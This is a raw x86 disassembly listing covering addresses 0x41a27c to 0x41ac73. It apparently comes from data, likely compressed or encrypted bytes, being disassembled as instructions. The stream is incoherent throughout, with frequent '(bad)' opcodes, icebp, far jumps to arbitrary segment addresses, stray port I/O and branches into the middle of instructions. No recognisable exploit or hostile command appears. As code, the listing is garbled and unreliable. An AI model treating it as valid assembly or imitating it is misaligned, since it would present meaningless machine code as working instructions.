  41a27c:	and    al,0x96
  41a27e:	(bad)  
  41a27f:	push   ecx
  41a280:	mov    edx,0x26aa8540
  41a285:	add    ax,0x2ab8
  41a289:	push   esp
  41a28a:	mov    DWORD PTR [edi+ebp*2-0x62],ebp
  41a28e:	sbb    ecx,ebp
  41a290:	imul   ebp,DWORD PTR [ebx-0x62f49183],0xaa7a56c7
  41a29a:	adc    edi,DWORD PTR [edx]
  41a29c:	push   ecx
  41a29d:	adc    esp,DWORD PTR [ecx+eax*1+0x24]
  41a2a1:	int    0x37
  41a2a3:	repnz and DWORD PTR [edx],ecx
  41a2a6:	jb     0x41a2b8
  41a2a8:	aam    0xf9
  41a2aa:	scas   eax,DWORD PTR es:[edi]
  41a2ab:	stc    
  41a2ac:	pop    edi
  41a2ad:	and    ch,al
  41a2af:	mov    BYTE PTR [esi-0x5713af55],al
  41a2b5:	ret    0xe318
  41a2b8:	jmp    0xebf1:0xb0b5bf65
  41a2bf:	or     BYTE PTR [esi],0xdf
  41a2c2:	lods   al,BYTE PTR ds:[esi]
  41a2c3:	lods   eax,DWORD PTR ds:[esi]
  41a2c4:	fimul  DWORD PTR [esi]
  41a2c6:	sub    edx,DWORD PTR cs:[eax+0x1b]
  41a2ca:	lock add DWORD PTR [ebx-0x37],ecx
  41a2ce:	icebp  
  41a2cf:	aas    
  41a2d0:	push   0xe97c98f5
  41a2d5:	shl    BYTE PTR [eax],cl
  41a2d7:	pop    esi
  41a2d8:	pop    ebp
  41a2d9:	cmp    DWORD PTR ds:0x4249b2fc,ecx
  41a2df:	cmp    BYTE PTR [eax+0x7094cfe7],dl
  41a2e5:	cs je  0x41a269
  41a2e8:	dec    ebx
  41a2e9:	jg     0x41a2be
  41a2eb:	maxps  xmm0,XMMWORD PTR [ebx+0x4]
  41a2ef:	dec    eax
  41a2f0:	add    BYTE PTR [ecx-0x64b2c647],dl
  41a2f6:	sbb    edx,esi
  41a2f8:	ins    DWORD PTR es:[edi],dx
  41a2f9:	jecxz  0x41a36a
  41a2fb:	push   ebx
  41a2fc:	int    0x2e
  41a2fe:	iret   
  41a2ff:	lods   eax,DWORD PTR ds:[esi]
  41a300:	aad    0xbd
  41a302:	fisubr WORD PTR ds:0x391ea5f6
  41a308:	mov    ah,0xb3
  41a30a:	icebp  
  41a30b:	dec    ebx
  41a30c:	push   0x5d
  41a30e:	retf   0xc225
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0xe1a6955c
  41a381:	pushf  
  41a382:	adc    al,0xb8
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0xa2000001
  41a38d:	icebp  
  41a38e:	add    BYTE PTR [ecx+0x14fbe6c7],al
  41a394:	xchg   esi,eax
  41a395:	jmp    0xc206:0xcf2935c9
  41a39c:	addr16 (bad) 
  41a39e:	mov    dh,0x72
  41a3a0:	adc    dh,BYTE PTR [edi+ebx*4+0x1]
  41a3a4:	repz sar DWORD PTR [ecx+ebp*4],0xcb
  41a3a9:	inc    edx
  41a3aa:	add    al,0x3f
  41a3ac:	pop    ebp
  41a3ad:	xlat   BYTE PTR ds:[ebx]
  41a3ae:	pop    edx
  41a3af:	cmp    ch,BYTE PTR [ecx+0x4c683911]
  41a3b5:	(bad)  
  41a3b6:	das    
  41a3b7:	sbb    ebx,DWORD PTR [ebx]
  41a3b9:	mov    ecx,0x63c45113
  41a3be:	leave  
  41a3bf:	data16 jbe 0x41a3aa
  41a3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3c3:	xchg   ebx,eax
  41a3c4:	pop    es
  41a3c5:	jmp    0x41a3cf
  41a3c7:	ret    
  41a3c8:	xchg   edx,eax
  41a3c9:	mov    esp,0xcadfec3b
  41a3ce:	out    0x91,al
  41a3d0:	jmp    0x668a:0xb45a73aa
  41a3d7:	fild   QWORD PTR [ecx-0x55]
  41a3da:	sub    ecx,ebx
  41a3dc:	(bad)  
  41a3dd:	int    0xe0
  41a3df:	mov    esi,0xf4509175
  41a3e4:	nop
  41a3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e6:	call   0xcffa:0x778a9e1
  41a3ed:	js     0x41a3bf
  41a3ef:	lods   eax,DWORD PTR ds:[esi]
  41a3f0:	jmp    0xb9c57726
  41a3f5:	clc    
  41a3f6:	mov    dh,0xa9
  41a3f8:	out    0x4e,al
  41a3fa:	push   ecx
  41a3fb:	lock dec edx
  41a3fd:	aas    
  41a3fe:	sbb    dh,dl
  41a400:	jp     0x41a472
  41a402:	xlat   BYTE PTR ds:[ebx]
  41a403:	or     dl,BYTE PTR [ebx-0x60]
  41a406:	je     0x41a3df
  41a408:	(bad)  
  41a409:	lea    eax,[esi+0xc]
  41a40c:	hlt    
  41a40d:	mov    dh,0xf6
  41a40f:	push   edx
  41a410:	xor    al,0x68
  41a412:	aaa    
  41a413:	retf   0xf1c6
  41a416:	pusha  
  41a417:	jbe    0x41a472
  41a419:	mov    DWORD PTR [esi],esp
  41a41b:	mov    BYTE PTR [ebx-0x2c22a89b],dl
  41a421:	inc    ebp
  41a422:	in     eax,0x6
  41a424:	aad    0x11
  41a426:	and    al,0xad
  41a428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a429:	xchg   esp,eax
  41a42a:	pop    edi
  41a42b:	add    esp,ecx
  41a42d:	jmp    0x23519904
  41a432:	lods   eax,DWORD PTR ds:[esi]
  41a433:	sub    eax,0xe779adc0
  41a438:	int3   
  41a439:	imul   DWORD PTR [ebp-0x489b867b]
  41a43f:	push   esi
  41a440:	pop    DWORD PTR [esi-0x88653a7]
  41a446:	mov    eax,0x7cdc6caf
  41a44b:	inc    esi
  41a44c:	sub    eax,0x72b7ec5c
  41a451:	neg    DWORD PTR [ebx]
  41a453:	adc    al,0x78
  41a455:	int    0x5c
  41a457:	retf   
  41a458:	in     al,dx
  41a459:	test   BYTE PTR [ecx+0x58],dl
  41a45c:	or     eax,0x1e8c1abc
  41a461:	retf   0xf337
  41a464:	arpl   WORD PTR [ebx-0x18],bp
  41a467:	push   ebx
  41a468:	out    dx,al
  41a469:	ror    BYTE PTR [eax+eax*8],0x5d
  41a46d:	jmp    0x91b31369
  41a472:	pop    eax
  41a473:	xor    eax,0xa1404d14
  41a478:	jmp    0x41a44f
  41a47a:	jmp    0x41a463
  41a47c:	(bad)  
  41a47d:	fst    QWORD PTR [edx]
  41a47f:	jno    0x41a437
  41a481:	test   BYTE PTR [edx-0x6d],0x4e
  41a485:	sub    al,dh
  41a487:	adc    ebp,ebp
  41a489:	in     eax,dx
  41a48a:	scas   al,BYTE PTR es:[edi]
  41a48b:	fs push edx
  41a48d:	pop    eax
  41a48e:	daa    
  41a48f:	mov    esp,0xb8
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	jmp    0x41a4c1
  41a502:	cmp    BYTE PTR [ebx],ch
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x31000001
  41a50d:	test   eax,0xbfbe07f6
  41a512:	add    BYTE PTR [edx+ebx*8+0x5],bl
  41a516:	mov    ebp,0x15efdc69
  41a51b:	mov    BYTE PTR [edx],al
  41a51d:	xor    eax,0x2ab2c7d0
  41a522:	push   edx
  41a523:	adc    dh,BYTE PTR [edi+0x7c0cea80]
  41a529:	mov    WORD PTR [edi+0x2c103068],cs
  41a52f:	stos   BYTE PTR es:[edi],al
  41a530:	repnz out dx,eax
  41a532:	daa    
  41a533:	cld    
  41a534:	xlat   BYTE PTR ds:[ebx]
  41a535:	(bad)  
  41a536:	sub    DWORD PTR [esi-0x1c],esi
  41a539:	mov    esi,0xfd8ab2eb
  41a53e:	or     al,BYTE PTR [ecx-0x73ce26cc]
  41a544:	add    al,BYTE PTR gs:[ebx+ecx*2+0x73891014]
  41a54c:	mov    dl,0xbd
  41a54e:	in     eax,dx
  41a54f:	ins    DWORD PTR es:[edi],dx
  41a550:	jno    0x41a580
  41a552:	fst    QWORD PTR [ebx+0x7]
  41a555:	jp     0x41a52d
  41a557:	cmp    DWORD PTR [esi+0x6fb6956a],edi
  41a55d:	cmp    DWORD PTR [ecx-0x1f],0x316645a6
  41a564:	mov    BYTE PTR [ecx+0x3a],ch
  41a567:	hlt    
  41a568:	xor    edi,DWORD PTR [edi]
  41a56a:	call   0xbbfb:0xc95d6111
  41a571:	and    BYTE PTR [esi+0x77],bh
  41a574:	ret    0xa7b8
  41a577:	xor    BYTE PTR [ebx-0x57],ch
  41a57a:	jl     0x41a550
  41a57c:	mov    ds:0x7e785a81,al
  41a581:	cs pop ebx
  41a583:	int3   
  41a584:	stos   BYTE PTR es:[edi],al
  41a585:	xchg   edx,eax
  41a586:	push   cs
  41a587:	stc    
  41a588:	in     al,dx
  41a589:	push   eax
  41a58a:	fsub   QWORD PTR [edx]
  41a58c:	pop    eax
  41a58d:	loop   0x41a5ed
  41a58f:	push   ss
  41a590:	add    DWORD PTR [edi],esi
  41a592:	fwait
  41a593:	ins    DWORD PTR es:[edi],dx
  41a594:	jb     0x41a5c2
  41a596:	cmp    al,0xf2
  41a598:	jmp    0x798:0x255e3172
  41a59f:	shl    ebx,0x55
  41a5a2:	pop    ss
  41a5a3:	adc    edi,DWORD PTR [ecx+esi*4-0x5f]
  41a5a7:	cs push ecx
  41a5a9:	repnz out dx,al
  41a5ab:	inc    esp
  41a5ac:	lods   al,BYTE PTR ds:[esi]
  41a5ad:	fwait
  41a5ae:	adc    bh,dl
  41a5b0:	call   DWORD PTR [edi+0x2d]
  41a5b3:	xchg   BYTE PTR [ebp+0x4a],al
  41a5b6:	or     al,0x28
  41a5b8:	pop    ss
  41a5b9:	pop    esp
  41a5ba:	adc    dh,BYTE PTR [ecx-0x331bc7a3]
  41a5c0:	fdivr  QWORD PTR ds:0xf7817296
  41a5c6:	iret   
  41a5c7:	rcr    BYTE PTR [ebx+0x5645f0d],1
  41a5cd:	call   0xd65504b0
  41a5d2:	xor    eax,ebx
  41a5d4:	sub    ecx,DWORD PTR [ebp+0x0]
  41a5d7:	jge    0x41a573
  41a5d9:	push   esp
  41a5da:	scas   eax,DWORD PTR es:[edi]
  41a5db:	pop    esp
  41a5dc:	std    
  41a5dd:	ins    DWORD PTR es:[edi],dx
  41a5de:	fimul  WORD PTR [eax]
  41a5e0:	pop    ecx
  41a5e1:	jmp    0xdf08:0xa8b534e6
  41a5e8:	scas   al,BYTE PTR es:[edi]
  41a5e9:	out    0xb5,eax
  41a5eb:	push   cs
  41a5ec:	jne    0x41a58a
  41a5ee:	adc    al,0x39
  41a5f0:	add    dh,BYTE PTR [ebx-0x5d]
  41a5f3:	leave  
  41a5f4:	mov    WORD PTR [edi-0x6e],gs
  41a5f7:	push   ss
  41a5f8:	imul   esi,DWORD PTR [edx+0x67],0x8d3e298c
  41a5ff:	rcl    DWORD PTR [ebp+0x15ab08c8],1
  41a605:	nop
  41a606:	push   ecx
  41a607:	pop    ds
  41a608:	add    ah,al
  41a60a:	push   0x40
  41a60c:	js     0x41a604
  41a60e:	ss cld 
  41a610:	scas   al,BYTE PTR es:[edi]
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x286fa625
  41a682:	repz xor BYTE PTR ds:0x5000118,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	sbb    al,0xe6
  41a68e:	int3   
  41a68f:	add    dh,dh
  41a691:	inc    eax
  41a692:	jo     0x41a666
  41a694:	leave  
  41a695:	and    BYTE PTR [ebp+0x221ae16a],bh
  41a69b:	jno    0x41a620
  41a69d:	repz inc ebx
  41a69f:	fdivr  st(2),st
  41a6a1:	in     eax,0xa0
  41a6a3:	inc    edi
  41a6a4:	bound  ebx,QWORD PTR [edx-0x5b735bdb]
  41a6aa:	mov    ch,0xc3
  41a6ac:	sbb    DWORD PTR [edx-0x78f9fa1a],esi
  41a6b2:	pop    ebp
  41a6b3:	fdivr  st(3),st
  41a6b5:	add    esi,DWORD PTR [edi+0x59]
  41a6b8:	jns    0x41a657
  41a6ba:	mov    ch,0xb7
  41a6bc:	imul   ebp,DWORD PTR [ebx-0x13],0xadade5e1
  41a6c3:	push   ebp
  41a6c4:	iret   
  41a6c5:	cld    
  41a6c6:	jno    0x41a66d
  41a6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c9:	fcmovnb st,st(1)
  41a6cb:	out    dx,al
  41a6cc:	aad    0x99
  41a6ce:	pop    eax
  41a6cf:	shl    DWORD PTR ss:[edi+eax*8-0x559873fc],1
  41a6d7:	add    BYTE PTR [edx-0x5],al
  41a6da:	sahf   
  41a6db:	or     esp,DWORD PTR [edi]
  41a6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6de:	pushf  
  41a6df:	lock push edx
  41a6e1:	js     0x41a6bc
  41a6e3:	test   DWORD PTR [ebx],eax
  41a6e5:	sbb    edi,DWORD PTR [edx]
  41a6e7:	jae    0x41a748
  41a6e9:	fst    DWORD PTR [edx-0x77c2c7b3]
  41a6ef:	sub    al,0xe2
  41a6f1:	aaa    
  41a6f2:	je     0x41a6ee
  41a6f4:	pop    ss
  41a6f5:	push   es
  41a6f6:	into   
  41a6f7:	push   ecx
  41a6f8:	ds dec ecx
  41a6fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6fb:	scas   eax,DWORD PTR es:[edi]
  41a6fc:	std    
  41a6fd:	fldcw  WORD PTR [eax+ebp*1]
  41a700:	pop    edx
  41a701:	push   ebp
  41a702:	call   0xdbd10fd9
  41a707:	sbb    bl,BYTE PTR [ebp+0x3c]
  41a70a:	dec    edi
  41a70b:	fs scas al,BYTE PTR es:[edi]
  41a70d:	test   DWORD PTR [edx],edx
  41a70f:	pusha  
  41a710:	std    
  41a711:	shl    DWORD PTR [eax-0x2ada944e],cl
  41a717:	jmp    0x6761:0xbe79ac56
  41a71e:	mov    ds:0xe751b306,al
  41a723:	sub    ebx,esi
  41a725:	test   ax,0xc07d
  41a729:	push   es
  41a72a:	xchg   edi,eax
  41a72b:	and    cl,ch
  41a72d:	repnz in eax,0xff
  41a730:	mov    edi,0x3b422d9e
  41a735:	lahf   
  41a736:	jl     0x41a79a
  41a738:	xor    DWORD PTR [esi],ebx
  41a73a:	push   0xe9b4196a
  41a73f:	mov    ecx,DWORD PTR [ebx+0x6409d40a]
  41a745:	call   0x6f69620f
  41a74a:	test   edx,0xdca1b4d1
  41a750:	push   ebp
  41a751:	adc    eax,0x8c5eb4ef
  41a756:	daa    
  41a757:	imul   ebp,DWORD PTR [ebx-0x1cba1f0d],0xffffffd7
  41a75e:	retf   0x567f
  41a761:	ret    0x450d
  41a764:	ds test eax,0x260f8815
  41a76a:	fidivr DWORD PTR [ebx-0x41]
  41a76d:	inc    ebp
  41a76e:	ins    DWORD PTR es:[edi],dx
  41a76f:	iret   
  41a770:	jnp    0x41a715
  41a772:	xor    DWORD PTR ds:0x2baca912,esi
  41a778:	std    
  41a779:	inc    esp
  41a77a:	pop    edx
  41a77b:	sub    bl,BYTE PTR fs:[ebx-0x133b154]
  41a782:	pop    ecx
  41a783:	or     al,0xfa
  41a785:	mov    eax,0xc92ebcf8
  41a78a:	lods   al,BYTE PTR ds:[esi]
  41a78b:	pushw  ds
  41a78d:	and    dh,BYTE PTR [esi]
  41a78f:	jbe    0x41a7a0
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x145327ca,al
  41a801:	mov    dl,0x73
  41a803:	inc    esp
  41a804:	cmp    bl,BYTE PTR [ecx]
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0xf7000001
  41a80d:	dec    edi
  41a80e:	scas   al,BYTE PTR es:[edi]
  41a80f:	fimul  WORD PTR [ebp+0x1fd69b45]
  41a815:	(bad)  
  41a816:	mov    WORD PTR [ebx],fs
  41a818:	std    
  41a819:	dec    edi
  41a81a:	or     DWORD PTR [edx+0xc],ebp
  41a81d:	in     eax,dx
  41a81e:	add    BYTE PTR [ebp+0x2c],0x5d
  41a822:	sti    
  41a823:	daa    
  41a824:	nop
  41a825:	mov    cl,0x3d
  41a827:	jmp    0xa5fd:0xeab6a1be
  41a82e:	mov    ecx,0xdd5a682c
  41a833:	jp     0x41a8b3
  41a835:	fisubr DWORD PTR [ebx]
  41a837:	mov    eax,ds:0x51fb91cc
  41a83c:	popa   
  41a83d:	clc    
  41a83e:	mov    eax,0x7e402fb2
  41a843:	mov    ch,0x63
  41a845:	rcr    DWORD PTR [esi-0x7e],1
  41a848:	cli    
  41a849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a84a:	fmul   DWORD PTR [esi+0x46]
  41a84d:	inc    esp
  41a84e:	cmp    ah,BYTE PTR [eax]
  41a850:	sbb    eax,0x4a7c4792
  41a855:	or     ebp,0xffffff81
  41a858:	mov    al,ds:0x5b809fa7
  41a85d:	inc    ebp
  41a85e:	mov    ah,BYTE PTR [eax+0x1d244a46]
  41a864:	rol    BYTE PTR [eax-0x41],cl
  41a867:	sub    eax,0xaaba9af8
  41a86c:	sub    BYTE PTR [edi+ebx*8+0x2f355822],al
  41a873:	jmp    0x41a802
  41a875:	icebp  
  41a876:	xchg   BYTE PTR [ecx+ebp*4+0xe],dh
  41a87a:	aad    0x23
  41a87c:	cmp    ebp,DWORD PTR [eax+edi*1]
  41a87f:	imul   eax,DWORD PTR [eax],0x74
  41a882:	push   edx
  41a883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a884:	cmp    al,BYTE PTR [esi+0x704365bc]
  41a88a:	mov    ebx,0xc11226cc
  41a88f:	mov    ch,0xc4
  41a891:	lods   al,BYTE PTR ds:[esi]
  41a892:	pop    ds
  41a893:	pop    edx
  41a894:	dec    esp
  41a895:	adc    dh,BYTE PTR [esi]
  41a897:	cmp    BYTE PTR [esi+eax*2-0x7fafb194],bh
  41a89e:	scas   al,BYTE PTR es:[edi]
  41a89f:	les    esp,FWORD PTR ds:0xede1a64f
  41a8a5:	hlt    
  41a8a6:	jge    0x41a84a
  41a8a8:	mov    edx,0x44ddc0d7
  41a8ad:	xchg   BYTE PTR [ebx],ch
  41a8af:	mov    edx,0x3e51c708
  41a8b4:	push   esi
  41a8b5:	mov    bl,0x16
  41a8b7:	pushf  
  41a8b8:	cdq    
  41a8b9:	push   eax
  41a8ba:	sbb    BYTE PTR [esp+edx*1],cl
  41a8bd:	int3   
  41a8be:	aam    0x41
  41a8c0:	test   eax,0xa19e7c97
  41a8c5:	call   0xaafa:0xba44cf23
  41a8cc:	jmp    0x9f96687f
  41a8d1:	aaa    
  41a8d2:	dec    eax
  41a8d3:	pop    ecx
  41a8d4:	adc    bh,BYTE PTR [ebx+0x63]
  41a8d7:	iret   
  41a8d8:	dec    ebx
  41a8d9:	jmp    esp
  41a8db:	shr    BYTE PTR [edi],cl
  41a8dd:	imul   ebx,DWORD PTR [edx+ecx*4+0x6e994074],0x76
  41a8e5:	push   edx
  41a8e6:	mov    ch,0x6d
  41a8e8:	mov    ebp,0x23843c46
  41a8ed:	loope  0x41a8b6
  41a8ef:	sub    al,0xf5
  41a8f1:	(bad)  
  41a8f2:	js     0x41a88c
  41a8f4:	div    DWORD PTR [ebx]
  41a8f6:	pop    ss
  41a8f7:	ror    BYTE PTR [edx+edx*4+0x4d],0x26
  41a8fc:	nop
  41a8fd:	inc    esp
  41a8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ff:	push   0xc3f6de38
  41a904:	sbb    bl,BYTE PTR [eax]
  41a906:	mov    ah,0x99
  41a908:	and    edx,ebp
  41a90a:	dec    esp
  41a90b:	cmp    edi,DWORD PTR [ecx-0x14]
  41a90e:	data16 mov dh,0x48
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	or     dl,dh
  41a982:	pop    ebp
  41a983:	daa    
  41a984:	aas    
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x64000001,al
  41a98d:	push   ss
  41a98e:	(bad)  
  41a98f:	imul   eax,DWORD PTR [eax+eax*8],0xabc9d3ec
  41a996:	outs   dx,DWORD PTR ds:[esi]
  41a997:	aas    
  41a998:	aam    0x7f
  41a99a:	(bad)  
  41a99b:	or     al,0xd1
  41a99d:	int3   
  41a99e:	inc    edi
  41a99f:	push   es
  41a9a0:	ret    
  41a9a1:	icebp  
  41a9a2:	inc    ebp
  41a9a3:	xor    al,0x8a
  41a9a5:	mov    ebx,0x4c6d6447
  41a9aa:	scas   eax,DWORD PTR es:[edi]
  41a9ab:	rcr    DWORD PTR [ebx],0x1
  41a9ae:	mov    ebx,0x6a0e6402
  41a9b3:	sbb    DWORD PTR [eax-0x31],eax
  41a9b6:	fcom   QWORD PTR [ecx+0x6f640f07]
  41a9bc:	adc    dl,0x72
  41a9bf:	push   edi
  41a9c0:	adc    edi,ebp
  41a9c2:	out    dx,eax
  41a9c3:	imul   esi,DWORD PTR [edx+0x7f7c787d],0x7f3f8474
  41a9cd:	add    al,dl
  41a9cf:	pop    ebp
  41a9d0:	test   DWORD PTR [eax],edi
  41a9d2:	fcomp  st(7)
  41a9d4:	adc    BYTE PTR ss:[ebx+0x60],bl
  41a9d8:	js     0x41aa0b
  41a9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9db:	dec    esp
  41a9dc:	inc    ecx
  41a9dd:	popa   
  41a9de:	(bad)  
  41a9df:	jmp    0xbf92eb1b
  41a9e4:	adc    BYTE PTR [edi+0x1b7cc329],bh
  41a9ea:	push   esi
  41a9eb:	loopne 0x41aa0f
  41a9ed:	pop    DWORD PTR [eax]
  41a9ef:	test   BYTE PTR [esi-0x71298d0e],0x55
  41a9f6:	fmul   DWORD PTR [esi+0x256f9238]
  41a9fc:	fldcw  WORD PTR [eax-0x77ac5df7]
  41aa02:	je     0x41a9e6
  41aa04:	push   esp
  41aa05:	cmp    ah,bl
  41aa07:	push   cs
  41aa08:	sub    edi,edi
  41aa0a:	jmp    FWORD PTR [eax-0x70]
  41aa0d:	jge    0x41a9c9
  41aa0f:	mov    cl,dl
  41aa11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa12:	std    
  41aa13:	int    0xb4
  41aa15:	add    DWORD PTR [edx+eiz*2],edx
  41aa18:	and    dh,bl
  41aa1a:	enter  0x3779,0xde
  41aa1e:	fmul   DWORD PTR [ecx]
  41aa20:	mul    ah
  41aa22:	in     eax,dx
  41aa23:	add    esi,DWORD PTR [ebp+0x1711a953]
  41aa29:	icebp  
  41aa2a:	xlat   BYTE PTR ds:[ebx]
  41aa2b:	jg     0x41aa44
  41aa2d:	adc    BYTE PTR [edx*8-0x10319735],ch
  41aa34:	mov    ebp,0x1839302f
  41aa39:	jp     0x41aa69
  41aa3b:	pushf  
  41aa3c:	in     al,dx
  41aa3d:	repz mov ebp,0xa5d961b9
  41aa43:	jl     0x41a9c9
  41aa45:	lock loop 0x41aa7c
  41aa48:	add    al,0xec
  41aa4a:	lds    ebx,FWORD PTR [edi]
  41aa4c:	out    dx,al
  41aa4d:	mov    ebx,0xbd88ff45
  41aa52:	xchg   BYTE PTR [ebx],al
  41aa54:	cdq    
  41aa55:	mov    dl,0x15
  41aa57:	loop   0x41a9f0
  41aa59:	jne    0xef6c202a
  41aa5f:	out    0xa7,eax
  41aa61:	pop    ecx
  41aa62:	ret    0x17e0
  41aa65:	imul   ebx,ebx,0x587d5c7c
  41aa6b:	jnp    0x41aa3e
  41aa6d:	icebp  
  41aa6e:	push   es
  41aa6f:	add    DWORD PTR [edi],esi
  41aa71:	aad    0x8e
  41aa73:	ret    0xa480
  41aa76:	enter  0x8623,0x79
  41aa7a:	ds inc ecx
  41aa7c:	xchg   ebx,esi
  41aa7e:	pop    edx
  41aa7f:	inc    ebp
  41aa80:	(bad)  
  41aa81:	adc    eax,0xfaa68a65
  41aa86:	int    0x1e
  41aa88:	pop    ebx
  41aa89:	mov    dl,0xd1
  41aa8b:	hlt    
  41aa8c:	into   
  41aa8d:	loopne 0x41aa43
  41aa8f:	enter  0x13,0x0
	...
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	ret    0x791
  41ab03:	push   ebx
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0xa2000001,al
  41ab0d:	sbb    BYTE PTR [edx-0x19],bl
  41ab10:	(bad)  
  41ab11:	retf   0x6acc
  41ab14:	(bad)  
  41ab15:	loopne 0x41ab1c
  41ab17:	mov    dl,cl
  41ab19:	lock jbe 0x41ab5e
  41ab1c:	inc    ebx
  41ab1d:	mov    esi,0xaa371b98
  41ab22:	gs test al,0xc5
  41ab25:	leave  
  41ab26:	std    
  41ab27:	adc    eax,0x73569315
  41ab2c:	jmp    0x4324:0x8b9ab8bd
  41ab33:	cmp    BYTE PTR [ecx+0x28],bl
  41ab36:	sar    esi,cl
  41ab38:	aad    0xcb
  41ab3a:	pop    ebp
  41ab3b:	mov    al,ds:0xb4560203
  41ab40:	jno    0x41aba5
  41ab42:	mov    al,0x15
  41ab44:	xrelease xchg DWORD PTR [eax-0x59],ecx
  41ab48:	add    ecx,edi
  41ab4a:	push   cs
  41ab4b:	xchg   ebx,eax
  41ab4c:	test   DWORD PTR [esp+eax*2-0x75],0x9ffc9d0c
  41ab54:	push   ds
  41ab55:	mov    bh,0x71
  41ab57:	out    0x3a,eax
  41ab59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab5a:	mov    esp,0x5ad06720
  41ab5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab60:	leave  
  41ab61:	vandps ymm2,ymm0,YMMWORD PTR [esi+ebx*8+0x7fff779]
  41ab6a:	sar    ah,cl
  41ab6c:	mov    ebx,0xd048d93a
  41ab71:	fisttp QWORD PTR [edi]
  41ab73:	xor    dh,al
  41ab75:	fcom   DWORD PTR [eax+0x1a]
  41ab78:	xchg   BYTE PTR [ebx-0x5],bh
  41ab7b:	test   eax,0x66be68e6
  41ab80:	pop    ss
  41ab81:	data16 jle 0x41abe0
  41ab84:	jp     0x41abfc
  41ab86:	(bad)  
  41ab87:	or     eax,0xd035b0f3
  41ab8c:	retf   
  41ab8d:	pop    esp
  41ab8e:	mov    cl,bh
  41ab90:	jno    0x41abd1
  41ab92:	daa    
  41ab93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab95:	in     eax,0xb4
  41ab97:	lahf   
  41ab98:	dec    esi
  41ab99:	mov    ebp,0xf3c0f880
  41ab9e:	adc    eax,0xbfcc1b7d
  41aba3:	and    eax,0xce256c32
  41aba8:	cmc    
  41aba9:	(bad)  
  41abaa:	sub    ebx,ecx
  41abac:	jle    0x41ab7b
  41abae:	jb     0x41ab72
  41abb0:	push   ebx
  41abb1:	add    esi,ecx
  41abb3:	jl     0x41ab3d
  41abb5:	jnp    0x41ab6c
  41abb7:	fidiv  WORD PTR [eax]
  41abb9:	fidiv  DWORD PTR [edi]
  41abbb:	hlt    
  41abbc:	add    al,BYTE PTR [eax+0x79]
  41abbf:	out    dx,al
  41abc0:	or     eax,0xea2f362b
  41abc5:	cwde   
  41abc6:	inc    edi
  41abc7:	push   ss
  41abc8:	push   ds
  41abc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abca:	and    DWORD PTR [ebx],esp
  41abcc:	adc    DWORD PTR [eax-0x64f587c2],ebp
  41abd2:	call   0xea62836f
  41abd7:	gs out 0x75,eax
  41abda:	enter  0x4696,0x3f
  41abde:	jbe    0x41abd8
  41abe0:	call   0x5363c543
  41abe5:	mov    al,0xff
  41abe7:	inc    DWORD PTR [ecx]
  41abe9:	ins    BYTE PTR es:[edi],dx
  41abea:	ja     0x41abcc
  41abec:	sbb    DWORD PTR [ebx+0x5e],ebp
  41abef:	cmp    bh,BYTE PTR [edi+ebx*1-0x5b0c037c]
  41abf6:	xchg   ecx,eax
  41abf7:	out    0x12,al
  41abf9:	adc    DWORD PTR [ebx],esp
  41abfb:	push   eax
  41abfc:	pop    ebx
  41abfd:	out    0x1f,al
  41abff:	rol    edi,cl
  41ac01:	aaa    
  41ac02:	in     al,dx
  41ac03:	mov    BYTE PTR [edx],dl
  41ac05:	jge    0x41ab8e
  41ac07:	xchg   BYTE PTR [esi-0x45],dh
  41ac0a:	inc    ebp
  41ac0b:	scas   eax,DWORD PTR es:[edi]
  41ac0c:	aad    0xc
  41ac0e:	adc    ah,cl
  41ac10:	lods   eax,DWORD PTR ds:[esi]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
